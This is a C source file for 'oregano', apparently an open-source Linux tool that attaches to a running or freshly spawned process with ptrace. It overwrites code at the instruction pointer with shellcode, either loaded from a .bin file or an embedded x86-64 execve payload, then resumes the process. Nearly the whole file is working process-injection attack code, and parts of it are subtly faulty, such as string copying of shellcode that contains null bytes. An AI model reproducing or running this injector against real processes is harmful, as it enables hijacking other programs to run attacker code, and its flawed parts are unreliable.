// oregano.c
// https://github.com/R-Rothrock/oregano

/*
 * MIT License
 *
 * Copyright (c) 2023 Roan Rothrock
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#define __OUTPUT__ // whether you want output
#define __DEBUG__  // whether you want _more_ output
#define __BANNER__ // whether you want a banner

#ifdef __DEBUG__
#  ifndef __OUTPUT__
#    define __OUTPUT__
#  endif
#  define DEBUG "\033[34m[-]\033[0m"
#endif

#ifdef __OUTPUT__
#  include<stdio.h>
#  define INFO "\033[32m[+]\033[0m"
#  define ERR  "\033[31m[!]\033[0m"
#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [EXECUTABLE/BIN]\n", X); exit(1);
#endif

#define __GNU_SOURCE

#include<errno.h>
#include<fcntl.h> /* open() */
#include<stdlib.h>
#include<string.h>
#include<sys/mman.h> /* mmap() */
#include<sys/ptrace.h> /* ptrace() */
#include<sys/reg.h> /* EIP, RIP */
#include<sys/stat.h> /* struct stat, fstat() */
#include<sys/types.h> /* pid_t, size_t */
#include<sys/wait.h> /* waitpid() */
#include<unistd.h>

// X64
#if defined(__x86_64)
#  define OFFSET -1
#  define IP_REG RIP
#  define PTR_T u_int64_t

// this is used ONLY if an executable is supplied as the second arguemnt
static u_int8_t base_shellcode[] = {
  0x48, 0x31, 0xc0,                         // xor rax, rax
  0x48, 0x31, 0xff,                         // xor rdi, rdi
  0x48, 0x31, 0xd2,                         // xor rdx, rdx
  0x52,                                     // push rdx
  0x48, 0x8d, 0x3d, 0x29, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101029]
  0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
  0x57,                                     // push rdi
  0x48, 0x89, 0xe6,                         // mov rsi, rsp
  0xb0, 0x3b,                               // mov al, 59 ; execve()
  0x0f, 0x05,                               // syscall
  0x48, 0x31, 0xc0,                         // xor rax,rax
  0xb0, 0x3c,                               // mov al, 60 ; exit()
  0x48, 0x31, 0xff,                         // xor rdi,rdi
  0x0f, 0x05                                // syscall
};

// X86
//#elif defined(__i836)
//#  define OFFSET -1
//#  define IP_REG EIP
//#  define PTR_T u_int32_t

//#elif defined(__aarch64__) // arm64
//#  define OFFSET 1
//#  define IP_REG RIP
//#  define PTR_T u_int64_t

//#elif defined(__arm__) // arm32
//#  define OFFSET 1
//#  define IP_REG EIP
//#  define PTR_T u_int32_t

#else
#  error unsupported architecture
#endif

u_int8_t child(char *pathname)
{
  //printf("Child is executing...");
  char *child_argv[] = {pathname, 0};
  char *child_envp[] = {0};
  int ret = execve(child_argv[0], child_argv, child_envp);
  exit(ret);
}

int attach(pid_t pid)
{
  int _;
  int ret = ptrace(PTRACE_ATTACH, pid);
  if(ret != 0)
  {
    return ret;
  }

  waitpid(pid, &_, 0);
  ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEEXIT);

  return 0;
}

PTR_T get_ip_reg(pid_t pid)
{
  long ret = ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * IP_REG);
  return (PTR_T) (ret + OFFSET);
}

const char *get_file_ext(const char *pathname) {
    const char *ptr = strrchr(pathname, '.');
    if(!ptr || ptr == pathname)
    {
      return "";
    }
    return ptr + 1;
}

int main(int argc, char *argv[])
{
  #ifdef __BANNER__
  printf("\033[32m\
 HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH\n\
 HHHH_|_|HHHH_|_|_|HHHH_|_|_|_|HHHH_|_|_|HHHH_|_|HHHH_|HHHHHH_|HHHH_|_|HHHH\n\
 HH_|HHHH_|HH_|HHHH_|HH_|HHHHHHHH_|HHHHHHHH_|HHHH_|HH_|_|HHHH_|HH_|HHHH_|HH\n\
 HH_|HHHH_|HH_|_|_|HHHH_|_|_|HHHH_|HH_|_|HH_|_|_|_|HH_|HH_|HH_|HH_|HHHH_|HH\n\
 HH_|HHHH_|HH_|HHHH_|HH_|HHHHHHHH_|HHHH_|HH_|HHHH_|HH_|HHHH_|_|HH_|HHHH_|HH\n\
 HHHH_|_|HHHH_|HHHH_|HH_|_|_|_|HHHH_|_|_|HH_|HHHH_|HH_|HHHHHH_|HHHH_|_|HHHH\n\
 HHHHHHHHHHHHHHHHHHHHHHHHHHHHRoanHRothrockHH<roan.rothrock@hotmail.com>HHHH\n\
\033[0m");
  #endif

  u_int8_t *shellcode;
  int shellcode_size;

  int ret; // to be used again and again
  pid_t pid;

  if(argc != 3)
  {
    HELP(argv[0]);
  }

  // handling argv[2] before argv[1]

  if(!strcmp(get_file_ext(argv[2]), "bin"))
  {
    int fd = open(argv[2], O_RDONLY);

    struct stat st;
    fstat(fd, &st);
    shellcode_size = st.st_size;

    shellcode = (u_int8_t*)mmap(NULL, shellcode_size, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
  } else
  {
    shellcode_size = strlen(base_shellcode) + strlen(argv[2]) + 1;

    shellcode = malloc(shellcode_size);
    strcpy(shellcode, base_shellcode);
    strcat(shellcode, argv[2]);
    strcat(shellcode, "\0");
  }

  #ifdef __DEBUG__
  printf("%s Shellcode size: %i\n", DEBUG, shellcode_size);

  printf("%s Shellcode: ", DEBUG);
  for(int i = 0; i < shellcode_size; i++)
  {
    if(i % 10 == 0)
    {
      printf("\n");
    }
    printf("0x%02x ", *(shellcode + i));
  }
  printf("\n");
  #endif

  // handling argv[1]

  char *str;
  long nr = strtol(argv[1], &str, 10);

  if(strlen(str) == 0)
  {
    // argv[1] is PID
    pid = (pid_t)nr;
  } else
  {
    // argv[1] is pathname
    // fork() and get PID
    #ifdef __OUTPUT__
    printf("%s Starting child.\n", INFO);
    #endif
    pid = fork();

    if(pid == 0)
    {
      child(argv[1]);
    }
    #ifdef __OUTPUT__
    printf("%s Child PID: %i.\n", INFO, pid);
    #endif
  }

  ret = attach(pid);
  if (ret != 0)
  {
    #ifdef __OUTPUT__
    printf("%s Failed to attach to process: %s\n", ERR, strerror(errno));
    #endif

    exit(1);
  }
  #ifdef __OUTPUT__
  printf("%s Attached to process %i.\n", INFO, pid);
  #endif

  PTR_T ip = get_ip_reg(pid);

  #ifdef __DEBUG__
  printf("%s Instruction pointer (RIP/EIP): %p\n", DEBUG, ip);
  #endif

  #ifdef __OUTPUT__
  printf("%s Injecting shellcode...\n", INFO);
  #endif

  for(int i = 0; i < strlen(shellcode) + 1; i++, ip++)
  {
    // too much output
    //#ifdef __DEBUG__
    //printf("%s %i: 0x%02x  %c\t%p\n", DEBUG, i, *(shellcode + i), *(shellcode + i), ip);
    //#endif

    ret = ptrace(PTRACE_POKETEXT, pid, ip, *(shellcode + i));
    if(ret != 0)
    {
      #ifdef __OUTPUT__
      printf("%s Error in injection: %s\n", ERR, strerror(errno));
      printf("%s Aborting...\n", ERR);
      #endif
      exit(1);
    }
  }

  #ifdef __OUTPUT__
  printf("%s Shellcode injected. Sending SIGCONT.\n", INFO);
  #  ifdef __DEBUG__
  printf("%s Seding SIGCONT with PTRACE_CONT\n", DEBUG);
  #  endif
  #endif

  ret = ptrace(PTRACE_CONT, pid, 0, 0);
  if(ret != 0)
  {
    #ifdef __OUTPUT__
    printf("%s Failed to start process: %s\n", ERR, strerror(errno));
    #endif

    exit(1);
  }

  int status;
  ret = waitpid(pid, &status, 0);

  #ifdef __OUTPUT__
  switch(WSTOPSIG(status))
  {
    case SIGTRAP:
      printf("%s Shellcode seems to have executed.\n", INFO);
      break;
    case SIGSEGV:
      printf("%s Shellcode caused the program to segfault.\n", ERR);
      #ifdef __DEBUG__
      printf("%s It does this sometimes... Try, try again :)\n", DEBUG);
      #endif
      break;
  }
  printf("%s Exiting...\n", INFO);
  #endif

  return 0;

}
